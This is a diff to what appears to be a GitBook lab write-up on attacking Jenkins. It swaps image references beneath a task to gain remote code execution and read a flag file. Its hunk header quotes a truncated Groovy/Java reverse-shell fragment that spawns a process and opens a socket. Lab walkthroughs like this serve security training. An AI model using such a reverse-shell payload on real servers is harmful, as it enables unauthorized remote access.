@@ -85,6 +85,6 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory
 
-<figure><img src="../../../.gitbook/assets/ภาพ (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/ภาพ (9).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/ภาพ (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/ภาพ (8).png" alt=""><figcaption></figcaption></figure>
